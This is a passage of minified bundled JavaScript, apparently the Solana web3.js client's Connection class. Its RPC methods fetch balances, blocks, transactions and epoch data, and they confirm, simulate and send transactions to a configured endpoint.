lot:J(),signatures:pe(ue()),blockTime:ge(J())}))),nm=ze(ge(se({slot:J(),meta:ge(bp),blockTime:be(ge(J())),transaction:Zw,version:be(Jl)}))),tf=ze(ge(se({slot:J(),transaction:sx,meta:ge(Jw),blockTime:be(ge(J())),version:be(Jl)}))),r3=tn(se({blockhash:ue(),lastValidBlockHeight:J()})),i3=tn(ki()),s3=se({slot:J(),numTransactions:J(),numSlots:J(),samplePeriodSecs:J()}),o3=ze(pe(s3)),a3=tn(ge(se({feeCalculator:se({lamportsPerSignature:J()})}))),l3=ze(ue()),c3=ze(ue()),u3=se({err:ma,logs:pe(ue()),signature:ue()}),h3=se({result:Ap(u3),subscription:J()}),f3={"solana-client":"js/1.0.0-maintenance"};class Xw{constructor(e,t){this._commitment=void 0,this._confirmTransactionInitialTimeout=void 0,this._rpcEndpoint=void 0,this._rpcWsEndpoint=void 0,this._rpcClient=void 0,this._rpcRequest=void 0,this._rpcBatchRequest=void 0,this._rpcWebSocket=void 0,this._rpcWebSocketConnected=!1,this._rpcWebSocketHeartbeat=null,this._rpcWebSocketIdleTimeout=null,this._rpcWebSocketGeneration=0,this._disableBlockhashCaching=!1,this._pollingBlockhash=!1,this._blockhashInfo={latestBlockhash:null,lastFetch:0,transactionSignatures:[],simulatedSignatures:[]},this._nextClientSubscriptionId=0,this._subscriptionDisposeFunctionsByClientSubscriptionId={},this._subscriptionHashByClientSubscriptionId={},this._subscriptionStateChangeCallbacksByHash={},this._subscriptionCallbacksByServerSubscriptionId={},this._subscriptionsByHash={},this._subscriptionsAutoDisposedByRpc=new Set,this.getBlockHeight=(()=>{const u={};return async h=>{const{commitment:f,config:m}=St(h),v=this._buildArgs([],f,void 0,m),x=wE(v);return u[x]=u[x]??(async()=>{try{const k=await this._rpcRequest("getBlockHeight",v),I=de(k,ze(J()));if("error"in I)throw new Ee(I.error,"failed to get block height information");return I.result}finally{delete u[x]}})(),await u[x]}})();let r,i,s,o,a,l;t&&typeof t=="string"?this._commitment=t:t&&(this._commitment=t.commitment,this._confirmTransactionInitialTimeout=t.confirmTransactionInitialTimeout,r=t.wsEndpoint,i=t.httpHeaders,s=t.fetch,o=t.fetchMiddleware,a=t.disableRetryOnRateLimit,l=t.httpAgent),this._rpcEndpoint=ZD(e),this._rpcWsEndpoint=r||QD(e),this._rpcClient=fO(e,i,s,o,a,l),this._rpcRequest=dO(this._rpcClient),this._rpcBatchRequest=pO(this._rpcClient),this._rpcWebSocket=new HD(this._rpcWsEndpoint,{autoconnect:!1,max_reconnects:1/0}),this._rpcWebSocket.on("open",this._wsOnOpen.bind(this)),this._rpcWebSocket.on("error",this._wsOnError.bind(this)),this._rpcWebSocket.on("close",this._wsOnClose.bind(this)),this._rpcWebSocket.on("accountNotification",this._wsOnAccountNotification.bind(this)),this._rpcWebSocket.on("programNotification",this._wsOnProgramAccountNotification.bind(this)),this._rpcWebSocket.on("slotNotification",this._wsOnSlotNotification.bind(this)),this._rpcWebSocket.on("slotsUpdatesNotification",this._wsOnSlotUpdatesNotification.bind(this)),this._rpcWebSocket.on("signatureNotification",this._wsOnSignatureNotification.bind(this)),this._rpcWebSocket.on("rootNotification",this._wsOnRootNotification.bind(this)),this._rpcWebSocket.on("logsNotification",this._wsOnLogsNotification.bind(this))}get commitment(){return this._commitment}get rpcEndpoint(){return this._rpcEndpoint}async getBalanceAndContext(e,t){const{commitment:r,config:i}=St(t),s=this._buildArgs([e.toBase58()],r,void 0,i),o=await this._rpcRequest("getBalance",s),a=de(o,tn(J()));if("error"in a)throw new Ee(a.error,`failed to get balance for ${e.toBase58()}`);return a.result}async getBalance(e,t){return await this.getBalanceAndContext(e,t).then(r=>r.value).catch(r=>{throw new Error("failed to get balance of account "+e.toBase58()+": "+r)})}async getBlockTime(e){const t=await this._rpcRequest("getBlockTime",[e]),r=de(t,ze(ge(J())));if("error"in r)throw new Ee(r.error,`failed to get block time for slot ${e}`);return r.result}async getMinimumLedgerSlot(){const e=await this._rpcRequest("minimumLedgerSlot",[]),t=de(e,ze(J()));if("error"in t)throw new Ee(t.error,"failed to get minimum ledger slot");return t.result}async getFirstAvailableBlock(){const e=await this._rpcRequest("getFirstAvailableBlock",[]),t=de(e,EO);if("error"in t)throw new Ee(t.error,"failed to get first available block");return t.result}async getSupply(e){let t={};typeof e=="string"?t={commitment:e}:e?t={...e,commitment:e&&e.commitment||this.commitment}:t={commitment:this.commitment};const r=await this._rpcRequest("getSupply",[t]),i=de(r,IO);if("error"in i)throw new Ee(i.error,"failed to get supply");return i.result}async getTokenSupply(e,t){const r=this._buildArgs([e.toBase58()],t),i=await this._rpcRequest("getTokenSupply",r),s=de(i,tn(L0));if("error"in s)throw new Ee(s.error,"failed to get token supply");return s.result}async getTokenAccountBalance(e,t){const r=this._buildArgs([e.toBase58()],t),i=await this._rpcRequest("getTokenAccountBalance",r),s=de(i,tn(L0));if("error"in s)throw new Ee(s.error,"failed to get token account balance");return s.result}async getTokenAccountsByOwner(e,t,r){const{commitment:i,config:s}=St(r);let o=[e.toBase58()];"mint"in t?o.push({mint:t.mint.toBase58()}):o.push({programId:t.programId.toBase58()});const a=this._buildArgs(o,i,"base64",s),l=await this._rpcRequest("getTokenAccountsByOwner",a),u=de(l,TO);if("error"in u)throw new Ee(u.error,`failed to get token accounts owned by account ${e.toBase58()}`);return u.result}async getParsedTokenAccountsByOwner(e,t,r){let i=[e.toBase58()];"mint"in t?i.push({mint:t.mint.toBase58()}):i.push({programId:t.programId.toBase58()});const s=this._buildArgs(i,r,"jsonParsed"),o=await this._rpcRequest("getTokenAccountsByOwner",s),a=de(o,AO);if("error"in a)throw new Ee(a.error,`failed to get token accounts owned by account ${e.toBase58()}`);return a.result}async getLargestAccounts(e){const t={...e,commitment:e&&e.commitment||this.commitment},r=t.filter||t.commitment?[t]:[],i=await this._rpcRequest("getLargestAccounts",r),s=de(i,bO);if("error"in s)throw new Ee(s.error,"failed to get largest accounts");return s.result}async getTokenLargestAccounts(e,t){const r=this._buildArgs([e.toBase58()],t),i=await this._rpcRequest("getTokenLargestAccounts",r),s=de(i,SO);if("error"in s)throw new Ee(s.error,"failed to get token largest accounts");return s.result}async getAccountInfoAndContext(e,t){const{commitment:r,config:i}=St(t),s=this._buildArgs([e.toBase58()],r,"base64",i),o=await this._rpcRequest("getAccountInfo",s),a=de(o,tn(ge(Ou)));if("error"in a)throw new Ee(a.error,`failed to get info about account ${e.toBase58()}`);return a.result}async getParsedAccountInfo(e,t){const{commitment:r,config:i}=St(t),s=this._buildArgs([e.toBase58()],r,"jsonParsed",i),o=await this._rpcRequest("getAccountInfo",s),a=de(o,tn(ge(O0)));if("error"in a)throw new Ee(a.error,`failed to get info about account ${e.toBase58()}`);return a.result}async getAccountInfo(e,t){try{return(await this.getAccountInfoAndContext(e,t)).value}catch(r){throw new Error("failed to get info about account "+e.toBase58()+": "+r)}}async getMultipleParsedAccounts(e,t){const{commitment:r,config:i}=St(t),s=e.map(u=>u.toBase58()),o=this._buildArgs([s],r,"jsonParsed",i),a=await this._rpcRequest("getMultipleAccounts",o),l=de(a,tn(pe(ge(O0))));if("error"in l)throw new Ee(l.error,`failed to get info for accounts ${s}`);return l.result}async getMultipleAccountsInfoAndContext(e,t){const{commitment:r,config:i}=St(t),s=e.map(u=>u.toBase58()),o=this._buildArgs([s],r,"base64",i),a=await this._rpcRequest("getMultipleAccounts",o),l=de(a,tn(pe(ge(Ou))));if("error"in l)throw new Ee(l.error,`failed to get info for accounts ${s}`);return l.result}async getMultipleAccountsInfo(e,t){return(await this.getMultipleAccountsInfoAndContext(e,t)).value}async getStakeActivation(e,t,r){const{commitment:i,config:s}=St(t),o=this._buildArgs([e.toBase58()],i,void 0,{...s,epoch:r??(s==null?void 0:s.epoch)}),a=await this._rpcRequest("getStakeActivation",o),l=de(a,ze(RO));if("error"in l)throw new Ee(l.error,`failed to get Stake Activation ${e.toBase58()}`);return l.result}async getProgramAccounts(e,t){const{commitment:r,config:i}=St(t),{encoding:s,...o}=i||{},a=this._buildArgs([e.toBase58()],r,s||"base64",{...o,...o.filters?{filters:EE(o.filters)}:null}),l=await this._rpcRequest("getProgramAccounts",a),u=pe(xO),h=o.withContext===!0?de(l,tn(u)):de(l,ze(u));if("error"in h)throw new Ee(h.error,`failed to get accounts owned by program ${e.toBase58()}`);return h.result}async getParsedProgramAccounts(e,t){const{commitment:r,config:i}=St(t),s=this._buildArgs([e.toBase58()],r,"jsonParsed",i),o=await this._rpcRequest("getProgramAccounts",s),a=de(o,ze(pe(CO)));if("error"in a)throw new Ee(a.error,`failed to get accounts owned by program ${e.toBase58()}`);return a.result}async confirmTransaction(e,t){var s;let r;if(typeof e=="string")r=e;else{const o=e;if((s=o.abortSignal)!=null&&s.aborted)return Promise.reject(o.abortSignal.reason);r=o.signature}let i;try{i=On.decode(r)}catch{throw new Error("signature must be base58 encoded: "+r)}return Bt(i.length===64,"signature has invalid length"),typeof e=="string"?await this.confirmTransactionUsingLegacyTimeoutStrategy({commitment:t||this.commitment,signature:r}):"lastValidBlockHeight"in e?await this.confirmTransactionUsingBlockHeightExceedanceStrategy({commitment:t||this.commitment,strategy:e}):await this.confirmTransactionUsingDurableNonceStrategy({commitment:t||this.commitment,strategy:e})}getCancellationPromise(e){return new Promise((t,r)=>{e!=null&&(e.aborted?r(e.reason):e.addEventListener("abort",()=>{r(e.reason)}))})}getTransactionConfirmationPromise({commitment:e,signature:t}){let r,i,s=!1;const o=new Promise((l,u)=>{try{r=this.onSignature(t,(f,m)=>{r=void 0;const v={context:m,value:f};l({__type:As.PROCESSED,response:v})},e);const h=new Promise(f=>{r==null?f():i=this._onSubscriptionStateChange(r,m=>{m==="subscribed"&&f()})});(async()=>{if(await h,s)return;const f=await this.getSignatureStatus(t);if(s||f==null)return;const{context:m,value:v}=f;if(v!=null)if(v!=null&&v.err)u(v.err);else{switch(e){case"confirmed":case"single":case"singleGossip":{if(v.confirmationStatus==="processed")return;break}case"finalized":case"max":case"root":{if(v.confirmationStatus==="processed"||v.confirmationStatus==="confirmed")return;break}case"processed":case"recent":}s=!0,l({__type:As.PROCESSED,response:{context:m,value:v}})}})()}catch(h){u(h)}});return{abortConfirmation:()=>{i&&(i(),i=void 0),r!=null&&(this.removeSignatureListener(r),r=void 0)},confirmationPromise:o}}async confirmTransactionUsingBlockHeightExceedanceStrategy({commitment:e,strategy:{abortSignal:t,lastValidBlockHeight:r,signature:i}}){let s=!1;const o=new Promise(f=>{const m=async()=>{try{return await this.getBlockHeight(e)}catch{return-1}};(async()=>{let v=await m();if(!s){for(;v<=r;)if(await Ba(1e3),s||(v=await m(),s))return;f({__type:As.BLOCKHEIGHT_EXCEEDED})}})()}),{abortConfirmation:a,confirmationPromise:l}=this.getTransactionConfirmationPromise({commitment:e,signature:i}),u=this.getCancellationPromise(t);let h;try{const f=await Promise.race([u,l,o]);if(f.__type===As.PROCESSED)h=f.response;else throw new qb(i)}finally{s=!0,a()}return h}async confirmTransactionUsingDurableNonceStrategy({commitment:e,strategy:{abortSignal:t,minContextSlot:r,nonceAccountPubkey:i,nonceValue:s,signature:o}}){let a=!1;const l=new Promise(v=>{let x=s,k=null;const I=async()=>{try{const{context:S,value:b}=await this.getNonceAndContext(i,{commitment:e,minContextSlot:r});return k=S.slot,b==null?void 0:b.nonce}catch{return x}};(async()=>{if(x=await I(),!a)for(;;){if(s!==x){v({__type:As.NONCE_INVALID,slotInWhichNonceDidAdvance:k});return}if(await Ba(2e3),a||(x=await I(),a))return}})()}),{abortConfirmation:u,confirmationPromise:h}=this.getTransactionConfirmationPromise({commitment:e,signature:o}),f=this.getCancellationPromise(t);let m;try{const v=await Promise.race([f,h,l]);if(v.__type===As.PROCESSED)m=v.response;else{let x;for(;;){const k=await this.getSignatureStatus(o);if(k==null)break;if(k.context.slot<(v.slotInWhichNonceDidAdvance??r)){await Ba(400);continue}x=k;break}if(x!=null&&x.value){const k=e||"finalized",{confirmationStatus:I}=x.value;switch(k){case"processed":case"recent":if(I!=="processed"&&I!=="confirmed"&&I!=="finalized")throw new Uc(o);break;case"confirmed":case"single":case"singleGossip":if(I!=="confirmed"&&I!=="finalized")throw new Uc(o);break;case"finalized":case"max":case"root":if(I!=="finalized")throw new Uc(o);break;default:}m={context:x.context,value:{err:x.value.err}}}else throw new Uc(o)}}finally{a=!0,u()}return m}async confirmTransactionUsingLegacyTimeoutStrategy({commitment:e,signature:t}){let r;const i=new Promise(l=>{let u=this._confirmTransactionInitialTimeout||6e4;switch(e){case"processed":case"recent":case"single":case"confirmed":case"singleGossip":{u=this._confirmTransactionInitialTimeout||3e4;break}}r=setTimeout(()=>l({__type:As.TIMED_OUT,timeoutMs:u}),u)}),{abortConfirmation:s,confirmationPromise:o}=this.getTransactionConfirmationPromise({commitment:e,signature:t});let a;try{const l=await Promise.race([o,i]);if(l.__type===As.PROCESSED)a=l.response;else throw new Kb(t,l.timeoutMs/1e3)}finally{clearTimeout(r),s()}return a}async getClusterNodes(){const e=await this._rpcRequest("getClusterNodes",[]),t=de(e,ze(pe(zO)));if("error"in t)throw new Ee(t.error,"failed to get cluster nodes");return t.result}async getVoteAccounts(e){const t=this._buildArgs([],e),r=await this._rpcRequest("getVoteAccounts",t),i=de(r,WO);if("error"in i)throw new Ee(i.error,"failed to get vote accounts");return i.result}async getSlot(e){const{commitment:t,config:r}=St(e),i=this._buildArgs([],t,void 0,r),s=await this._rpcRequest("getSlot",i),o=de(s,ze(J()));if("error"in o)throw new Ee(o.error,"failed to get slot");return o.result}async getSlotLeader(e){const{commitment:t,config:r}=St(e),i=this._buildArgs([],t,void 0,r),s=await this._rpcRequest("getSlotLeader",i),o=de(s,ze(ue()));if("error"in o)throw new Ee(o.error,"failed to get slot leader");return o.result}async getSlotLeaders(e,t){const r=[e,t],i=await this._rpcRequest("getSlotLeaders",r),s=de(i,ze(pe(Gt)));if("error"in s)throw new Ee(s.error,"failed to get slot leaders");return s.result}async getSignatureStatus(e,t){const{context:r,value:i}=await this.getSignatureStatuses([e],t);Bt(i.length===1);const s=i[0];return{context:r,value:s}}async getSignatureStatuses(e,t){const r=[e];t&&r.push(t);const i=await this._rpcRequest("getSignatureStatuses",r),s=de(i,qO);if("error"in s)throw new Ee(s.error,"failed to get signature status");return s.result}async getTransactionCount(e){const{commitment:t,config:r}=St(e),i=this._buildArgs([],t,void 0,r),s=await this._rpcRequest("getTransactionCount",i),o=de(s,ze(J()));if("error"in o)throw new Ee(o.error,"failed to get transaction count");return o.result}async getTotalSupply(e){return(await this.getSupply({commitment:e,excludeNonCirculatingAccountsList:!0})).value.total}async getInflationGovernor(e){const t=this._buildArgs([],e),r=await this._rpcRequest("getInflationGovernor",t),i=de(r,gO);if("error"in i)throw new Ee(i.error,"failed to get inflation");return i.result}async getInflationReward(e,t,r){const{commitment:i,config:s}=St(r),o=this._buildArgs([e.map(u=>u.toBase58())],i,void 0,{...s,epoch:t??(s==null?void 0:s.epoch)}),a=await this._rpcRequest("getInflationReward",o),l=de(a,eO);if("error"in l)throw new Ee(l.error,"failed to get inflation reward");return l.result}async getInflationRate(){const e=await this._rpcRequest("getInflationRate",[]),t=de(e,mO);if("error"in t)throw new Ee(t.error,"failed to get inflation rate");return t.result}async getEpochInfo(e){const{commitment:t,config:r}=St(e),i=this._buildArgs([],t,void 0,r),s=await this._rpcRequest("getEpochInfo",i),o=de(s,wO);if("error"in o)throw new Ee(o.error,"failed to get epoch info");return o.result}async getEpochSchedule(){const e=await this._rpcRequest("getEpochSchedule",[]),t=de(e,vO);if("error"in t)throw new Ee(t.error,"failed to get epoch schedule");const r=t.result;return new WD(r.slotsPerEpoch,r.leaderScheduleSlotOffset,r.warmup,r.firstNormalEpoch,r.firstNormalSlot)}async getLeaderSchedule(){const e=await this._rpcRequest("getLeaderSchedule",[]),t=de(e,_O);if("error"in t)throw new Ee(t.error,"failed to get leader schedule");return t.result}async getMinimumBalanceForRentExemption(e,t){const r=this._buildArgs([e],t),i=await this._rpcRequest("getMinimumBalanceForRentExemption",r),s=de(i,KO);return"error"in s?(console.warn("Unable to fetch minimum balance for rent exemption"),0):s.result}async getRecentBlockhashAndContext(e){const{context:t,value:{blockhash:r}}=await this.getLatestBlockhashAndContext(e);return{context:t,value:{blockhash:r,feeCalculator:{get lamportsPerSignature(){throw new Error("The capability to fetch `lamportsPerSignature` using the `getRecentBlockhash` API is no longer offered by the network. Use the `getFeeForMessage` API to obtain the fee for a given message.")},toJSON(){return{}}}}}}async getRecentPerformanceSamples(e){const t=await this._rpcRequest("getRecentPerformanceSamples",e?[e]:[]),r=de(t,o3);if("error"in r)throw new Ee(r.error,"failed to get recent performance samples");return r.result}async getFeeCalculatorForBlockhash(e,t){const r=this._buildArgs([e],t),i=await this._rpcRequest("getFeeCalculatorForBlockhash",r),s=de(i,a3);if("error"in s)throw new Ee(s.error,"failed to get fee calculator");const{context:o,value:a}=s.result;return{context:o,value:a!==null?a.feeCalculator:null}}async getFeeForMessage(e,t){const r=Nn(e.serialize()).toString("base64"),i=this._buildArgs([r],t),s=await this._rpcRequest("getFeeForMessage",i),o=de(s,tn(ge(J())));if("error"in o)throw new Ee(o.error,"failed to get fee for message");if(o.result===null)throw new Error("invalid blockhash");return o.result}async getRecentPrioritizationFees(e){var o;const t=(o=e==null?void 0:e.lockedWritableAccounts)==null?void 0:o.map(a=>a.toBase58()),r=t!=null&&t.length?[t]:[],i=await this._rpcRequest("getRecentPrioritizationFees",r),s=de(i,yO);if("error"in s)throw new Ee(s.error,"failed to get recent prioritization fees");return s.result}async getRecentBlockhash(e){try{return(await this.getRecentBlockhashAndContext(e)).value}catch(t){throw new Error("failed to get recent blockhash: "+t)}}async getLatestBlockhash(e){try{return(await this.getLatestBlockhashAndContext(e)).value}catch(t){throw new Error("failed to get recent blockhash: "+t)}}async getLatestBlockhashAndContext(e){const{commitment:t,config:r}=St(e),i=this._buildArgs([],t,void 0,r),s=await this._rpcRequest("getLatestBlockhash",i),o=de(s,r3);if("error"in o)throw new Ee(o.error,"failed to get latest blockhash");return o.result}async isBlockhashValid(e,t){const{commitment:r,config:i}=St(t),s=this._buildArgs([e],r,void 0,i),o=await this._rpcRequest("isBlockhashValid",s),a=de(o,i3);if("error"in a)throw new Ee(a.error,"failed to determine if the blockhash `"+e+"`is valid");return a.result}async getVersion(){const e=await this._rpcRequest("getVersion",[]),t=de(e,ze(lO));if("error"in t)throw new Ee(t.error,"failed to get version");return t.result}async getGenesisHash(){const e=await this._rpcRequest("getGenesisHash",[]),t=de(e,ze(ue()));if("error"in t)throw new Ee(t.error,"failed to get genesis hash");return t.result}async getBlock(e,t){const{commitment:r,config:i}=St(t),s=this._buildArgsAtLeastConfirmed([e],r,void 0,i),o=await this._rpcRequest("getBlock",s);try{switch(i==null?void 0:i.transactionDetails){case"accounts":{const a=de(o,JO);if("error"in a)throw a.error;return a.result}case"none":{const a=de(o,ZO);if("error"in a)throw a.error;return a.result}default:{const a=de(o,YO);if("error"in a)throw a.error;const{result:l}=a;return l?{...l,transactions:l.transactions.map(({transaction:u,meta:h,version:f})=>({meta:h,transaction:{...u,message:tm(f,u.message)},version:f}))}:null}}}catch(a){throw new Ee(a,"failed to get confirmed block")}}async getParsedBlock(e,t){const{commitment:r,config:i}=St(t),s=this._buildArgsAtLeastConfirmed([e],r,"jsonParsed",i),o=await this._rpcRequest("getBlock",s);try{switch(i==null?void 0:i.transactionDetails){case"accounts":{const a=de(o,e3);if("error"in a)throw a.error;return a.result}case"none":{const a=de(o,t3);if("error"in a)throw a.error;return a.result}default:{const a=de(o,XO);if("error"in a)throw a.error;return a.result}}}catch(a){throw new Ee(a,"failed to get block")}}async getBlockProduction(e){let t,r;if(typeof e=="string")r=e;else if(e){const{commitment:a,...l}=e;r=a,t=l}const i=this._buildArgs([],r,"base64",t),s=await this._rpcRequest("getBlockProduction",i),o=de(s,hO);if("error"in o)throw new Ee(o.error,"failed to get block production information");return o.result}async getTransaction(e,t){const{commitment:r,config:i}=St(t),s=this._buildArgsAtLeastConfirmed([e],r,void 0,i),o=await this._rpcRequest("getTransaction",s),a=de(o,nm);if("error"in a)throw new Ee(a.error,"failed to get transaction");const l=a.result;return l&&{...l,transaction:{...l.transaction,message:tm(l.version,l.transaction.message)}}}async getParsedTransaction(e,t){const{commitment:r,config:i}=St(t),s=this._buildArgsAtLeastConfirmed([e],r,"jsonParsed",i),o=await this._rpcRequest("getTransaction",s),a=de(o,tf);if("error"in a)throw new Ee(a.error,"failed to get transaction");return a.result}async getParsedTransactions(e,t){const{commitment:r,config:i}=St(t),s=e.map(l=>({methodName:"getTransaction",args:this._buildArgsAtLeastConfirmed([l],r,"jsonParsed",i)}));return(await this._rpcBatchRequest(s)).map(l=>{const u=de(l,tf);if("error"in u)throw new Ee(u.error,"failed to get transactions");return u.result})}async getTransactions(e,t){const{commitment:r,config:i}=St(t),s=e.map(l=>({methodName:"getTransaction",args:this._buildArgsAtLeastConfirmed([l],r,void 0,i)}));return(await this._rpcBatchRequest(s)).map(l=>{const u=de(l,nm);if("error"in u)throw new Ee(u.error,"failed to get transactions");const h=u.result;return h&&{...h,transaction:{...h.transaction,message:tm(h.version,h.transaction.message)}}})}async getConfirmedBlock(e,t){const r=this._buildArgsAtLeastConfirmed([e],t),i=await this._rpcRequest("getBlock",r),s=de(i,n3);if("error"in s)throw new Ee(s.error,"failed to get confirmed block");const o=s.result;if(!o)throw new Error("Confirmed block "+e+" not found");const a={...o,transactions:o.transactions.map(({transaction:l,meta:u})=>{const h=new as(l.message);return{meta:u,transaction:{...l,message:h}}})};return{...a,transactions:a.transactions.map(({transaction:l,meta:u})=>({meta:u,transaction:xr.populate(l.message,l.signatures)}))}}async getBlocks(e,t,r){const i=this._buildArgsAtLeastConfirmed(t!==void 0?[e,t]:[e],r),s=await this._rpcRequest("getBlocks",i),o=de(s,ze(pe(J())));if("error"in o)throw new Ee(o.error,"failed to get blocks");return o.result}async getBlockSignatures(e,t){const r=this._buildArgsAtLeastConfirmed([e],t,void 0,{transactionDetails:"signatures",rewards:!1}),i=await this._rpcRequest("getBlock",r),s=de(i,TE);if("error"in s)throw new Ee(s.error,"failed to get block");const o=s.result;if(!o)throw new Error("Block "+e+" not found");return o}async getConfirmedBlockSignatures(e,t){const r=this._buildArgsAtLeastConfirmed([e],t,void 0,{transactionDetails:"signatures",rewards:!1}),i=await this._rpcRequest("getBlock",r),s=de(i,TE);if("error"in s)throw new Ee(s.error,"failed to get confirmed block");const o=s.result;if(!o)throw new Error("Confirmed block "+e+" not found");return o}async getConfirmedTransaction(e,t){const r=this._buildArgsAtLeastConfirmed([e],t),i=await this._rpcRequest("getTransaction",r),s=de(i,nm);if("error"in s)throw new Ee(s.error,"failed to get transaction");const o=s.result;if(!o)return o;const a=new as(o.transaction.message),l=o.transaction.signatures;return{...o,transaction:xr.populate(a,l)}}async getParsedConfirmedTransaction(e,t){const r=this._buildArgsAtLeastConfirmed([e],t,"jsonParsed"),i=await this._rpcRequest("getTransaction",r),s=de(i,tf);if("error"in s)throw new Ee(s.error,"failed to get confirmed transaction");return s.result}async getParsedConfirmedTransactions(e,t){const r=e.map(o=>({methodName:"getTransaction",args:this._buildArgsAtLeastConfirmed([o],t,"jsonParsed")}));return(await this._rpcBatchRequest(r)).map(o=>{const a=de(o,tf);if("error"in a)throw new Ee(a.error,"failed to get confirmed transactions");return a.result})}async getConfirmedSignaturesForAddress(e,t,r){let i={},s=await this.getFirstAvailableBlock();for(;!("until"in i)&&(t--,!(t<=0||t<s));)try{const l=await this.getConfirmedBlockSignatures(t,"finalized");l.signatures.length>0&&(i.until=l.signatures[l.signatures.length-1].toString())}catch(l){if(l instanceof Error&&l.message.includes("skipped"))continue;throw l}let o=await this.getSlot("finalized");for(;!("before"in i)&&(r++,!(r>o));)try{const l=await this.getConfirmedBlockSignatures(r);l.signatures.length>0&&(i.before=l.signatures[l.signatures.length-1].toString())}catch(l){if(l instanceof Error&&l.message.includes("skipped"))continue;throw l}return(await this.getConfirmedSignaturesForAddress2(e,i)).map(l=>l.signature)}async getConfirmedSignaturesForAddress2(e,t,r){const i=this._buildArgsAtLeastConfirmed([e.toBase58()],r,void 0,t),s=await this._rpcRequest("getConfirmedSignaturesForAddress2",i),o=de(s,MO);if("error"in o)throw new Ee(o.error,"failed to get confirmed signatures for address");return o.result}async getSignaturesForAddress(e,t,r){const i=this._buildArgsAtLeastConfirmed([e.toBase58()],r,void 0,t),s=await this._rpcRequest("getSignaturesForAddress",i),o=de(s,NO);if("error"in o)throw new Ee(o.error,"failed to get signatures for address");return o.result}async getAddressLookupTable(e,t){const{context:r,value:i}=await this.getAccountInfoAndContext(e,t);let s=null;return i!==null&&(s=new _E({key:e,state:_E.deserialize(i.data)})),{context:r,value:s}}async getNonceAndContext(e,t){const{context:r,value:i}=await this.getAccountInfoAndContext(e,t);let s=null;return i!==null&&(s=Qw.fromAccountData(i.data)),{context:r,value:s}}async getNonce(e,t){return await this.getNonceAndContext(e,t).then(r=>r.value).catch(r=>{throw new Error("failed to get nonce for account "+e.toBase58()+": "+r)})}async requestAirdrop(e,t){const r=await this._rpcRequest("requestAirdrop",[e.toBase58(),t]),i=de(r,l3);if("error"in i)throw new Ee(i.error,`airdrop to ${e.toBase58()} failed`);return i.result}async _blockhashWithExpiryBlockHeight(e){if(!e){for(;this._pollingBlockhash;)await Ba(100);const r=Date.now()-this._blockhashInfo.lastFetch>=YD;if(this._blockhashInfo.latestBlockhash!==null&&!r)return this._blockhashInfo.latestBlockhash}return await this._pollNewBlockhash()}async _pollNewBlockhash(){this._pollingBlockhash=!0;try{const e=Date.now(),t=this._blockhashInfo.latestBlockhash,r=t?t.blockhash:null;for(let i=0;i<50;i++){const s=await this.getLatestBlockhash("finalized");if(r!==s.blockhash)return this._blockhashInfo={latestBlockhash:s,lastFetch:Date.now(),transactionSignatures:[],simulatedSignatures:[]},s;await Ba(DD/2)}throw new Error(`Unable to obtain a new blockhash after ${Date.now()-e}ms`)}finally{this._pollingBlockhash=!1}}async getStakeMinimumDelegation(e){const{commitment:t,config:r}=St(e),i=this._buildArgs([],t,"base64",r),s=await this._rpcRequest("getStakeMinimumDelegation",i),o=de(s,tn(J()));if("error"in o)throw new Ee(o.error,"failed to get stake minimum delegation");return o.result}async simulateTransaction(e,t,r){if("message"in e){const k=e.serialize(),I=Le.Buffer.from(k).toString("base64");if(Array.isArray(t)||r!==void 0)throw new Error("Invalid arguments");const S=t||{};S.encoding="base64","commitment"in S||(S.commitment=this.commitment),t&&typeof t=="object"&&"innerInstructions"in t&&(S.innerInstructions=t.innerInstructions);const b=[I,S],E=await this._rpcRequest("simulateTransaction",b),U=de(E,IE);if("error"in U)throw new Error("failed to simulate transaction: "+U.error.message);return U.result}let i;if(e instanceof xr){let x=e;i=new xr,i.feePayer=x.feePayer,i.instructions=e.instructions,i.nonceInfo=x.nonceInfo,i.signatures=x.signatures}else i=xr.populate(e),i._message=i._json=void 0;if(t!==void 0&&!Array.isArray(t))throw new Error("Invalid arguments");const s=t;if(i.nonceInfo&&s)i.sign(...s);else{let x=this._disableBlockhashCaching;for(;;){const k=await this._blockhashWithExpiryBlockHeight(x);if(i.lastValidBlockHeight=k.lastValidBlockHeight,i.recentBlockhash=k.blockhash,!s)break;if(i.sign(...s),!i.signature)throw new Error("!signature");const I=i.signature.toString("base64");if(!this._blockhashInfo.simulatedSignatures.includes(I)&&!this._blockhashInfo.transactionSignatures.includes(I)){this._blockhashInfo.simulatedSignatures.push(I);break}else x=!0}}const o=i._compile(),a=o.serialize(),u=i._serialize(a).toString("base64"),h={encoding:"base64",commitment:this.commitment};if(r){const x=(Array.isArray(r)?r:o.nonProgramIds()).map(k=>k.toBase58());h.accounts={encoding:"base64",addresses:x}}s&&(h.sigVerify=!0),t&&typeof t=="object"&&"innerInstructions"in t&&(h.innerInstructions=t.innerInstructions);const f=[u,h],m=await this._rpcRequest("simulateTransaction",f),v=de(m,IE);if("error"in v){let x;if("data"in v.error&&(x=v.error.data.logs,x&&Array.isArray(x))){const k=`
    `,I=k+x.join(k);console.error(v.error.message,I)}throw new gE({action:"simulate",signature:"",transactionMessage:v.error.message,logs:x})}return v.result}async sendTransaction(e,t,r){if("version"in e){if(t&&Array.isArray(t))throw new Error("Invalid arguments");const o=e.serialize();return await this.sendRawTransaction(o,t)}if(t===void 0||!Array.isArray(t))throw new Error("Invalid arguments");const i=t;if(e.nonceInfo)e.sign(...i);else{let o=this._disableBlockhashCaching;for(;;){const a=await this._blockhashWithExpiryBlockHeight(o);if(e.lastValidBlockHeight=a.lastValidBlockHeight,e.recentBlockhash=a.blockhash,e.sign(...i),!e.signature)throw new Error("!signature");const l=e.signature.toString("base64");if(this._blockhashInfo.transactionSignatures.includes(l))o=!0;else{this._blockhashInfo.transactionSignatures.push(l);break}}}const s=e.serialize();return await this.sendRawTransaction(s,r)}async sendRawTransaction(e,t){const r=Nn(e).toString("base64");return await this.sendEncodedTransaction(r,t)}async sendEncodedTransaction(e,t){const r={encoding:"base64"},i=t&&t.skipPreflight,s=i===!0?"processed":t&&t.preflightCommitment||this.commitment;t&&t.maxRetries!=null&&(r.maxRetries=t.maxRetries),t&&t.minContextSlot!=null&&(r.minContextSlot=t.minContextSlot),i&&(r.skipPreflight=i),s&&(r.preflightCommitment=s);const o=[e,r],a=await this._rpcRequest("sendTransaction",o),l=de(a,c3);if("error"in l){let u;throw"data"in l.error&&(u=l.error.data.logs),new gE({action:i?"send":"simulate",signature:"",transactionMessage:l.error.message,logs:u})}return l.result}_wsOnOpen(){this._rpcWebSocketConnected=!0,this._rpcWebSocketHeartbeat=setInterval(()=>{(async()=>{try{await 